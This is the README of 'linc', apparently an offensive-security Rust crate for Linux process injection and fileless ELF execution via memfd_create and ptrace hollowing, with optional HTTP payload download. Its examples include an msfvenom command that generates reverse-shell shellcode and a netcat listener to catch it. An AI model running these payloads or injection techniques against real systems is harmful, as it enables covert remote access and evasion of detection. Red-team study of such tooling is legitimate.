# LINC - Linux INjection Crate
`linc` is a Rust crate containing implementations for process injection and fileless ELF execution techniques on Linux.

## Functionality
The following techniques are currently implemented:
- Using [memfd_create(2)](https://man7.org/linux/man-pages/man2/memfd_create.2.html) to create an anonymous file in memory, write an ELF to it, and then execute.
- Using [ptrace(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html) to stop a forked process, overwrite its RIP register with shellcode, and then resume it.

## Usage
Add `linc` as a dependency to your Rust project with default features enabled
```bash
cargo add --git https://github.com/dustyw0lf/linc.git
```

Add `linc` without default features
```bash
cargo add --git https://github.com/dustyw0lf/linc.git --no-default-features
```

## Features
`linc` has the following features, enabled by default:
- `http`: Adds functionality to download payloads over HTTP/S.

## Examples
>[!note]
>The examples can take binaries or shellcode from either URLs or filesystem paths.

Clone the repo
```bash
git clone https://github.com/dustyw0lf/linc.git
```

Change directory into `linc`
```bash
cd linc
```

### memfd
Run the memfd example with an ELF file
```bash
cargo run --example memfd_executable
```

Run the memfd example with the provided shellcode or use your own:
```bash
msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
```

Start a listener
```bash
nc -lvnp 1234
```

Run the example
```bash
cargo run --example memfd_shellcode
```

### hollow
Run the hollow example with shellcode
```bash
cargo run --example hollow_shellcode
```

## Documentation
Build the documentation
```bash
cargo doc --no-deps
```

The documentation will be in `target/doc/linc/index.html`.

## Acknowledgments
The code that turns shellcode into an ELF file was taken from the [minimal-elf](https://github.com/tchajed/minimal-elf) repository by [Tej Chajed](https://www.chajed.io).